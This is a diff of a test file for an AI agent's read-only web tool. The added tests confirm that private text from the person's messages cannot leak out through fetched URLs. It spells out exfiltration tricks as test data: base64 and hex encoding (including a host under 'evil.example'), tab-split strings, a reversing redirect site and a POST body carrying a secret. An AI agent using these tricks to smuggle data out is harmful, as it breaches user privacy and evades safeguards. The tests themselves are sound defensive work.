@@ -133,7 +133,21 @@ describe('flux_read_web: one public page as text, read-only, with its source kep
       assert.equal(code(refused.message), 'WEB_READ_PRIVATE_TEXT', url);
       assert.match((JSON.parse(text(refused.message)) as { error: string }).error, /words you read in Flux.*It carries "[^"]{12}"/s, 'the agent is told why, and which words');
     }
+    // In a base64 run, split by a tab the URL parser drops, or hex in a host label: the same.
+    for (const url of [`${at('/read/collect')}?d=${Buffer.from('buy Harbour Co shares').toString('base64url')}`, `${at('/read/collect')}?d=buy Har\tbour Co shares`,
+      `https://${Buffer.from('Harbour Co shares').toString('hex')}.evil.example/`])
+      assert.equal(code((await reading(run, url)).message), 'WEB_READ_PRIVATE_TEXT', url);
     assert.deepEqual(await hits('/'), [], 'nothing went to the site');
+    // A site that unpacks what it was sent (here: written backwards) and redirects to it: the hop that would carry the words is refused
+    // before it is asked, and only the first address went out, listed as redirected.
+    const unpack = at(`/unpack/${encodeURIComponent([...'/read/collect?d=buy Harbour Co shares'].reverse().join(''))}`);
+    assert.equal(code((await reading(run, unpack)).message), 'WEB_READ_PRIVATE_TEXT', 'the redirect hop');
+    assert.deepEqual((await hits('/')).map((hit) => hit.path.split('/')[1]), ['unpack'], 'the hop was never asked');
+    const unpacked = (await pool.query(`SELECT final_url, outcome FROM personal_run_web_reads WHERE run_id = $1 AND final_url LIKE '%/unpack/%'`, [run.runId])).rows;
+    assert.deepEqual(unpacked.map((row) => row.outcome), ['redirected']);
+    // GET only, and the address is all the tool takes: no method or body can be given.
+    const posted = await run.raw('tools/call', { name: 'flux_read_web', arguments: { url: at('/read/notes'), method: 'POST', body: secret } });
+    assert.match(text(posted.message), /Input validation/, 'the input is strict');
     assert.equal(result((await reading(run, at('/read/notes'))).message)?.isError, undefined, 'the address the person wrote in the message still opens');
     assert.equal(result((await reading(run, `${at('/read/second')}?topic=harbour`)).message)?.isError, undefined, 'and so does one with a single word of it');
     await scene.complete(run.runId);
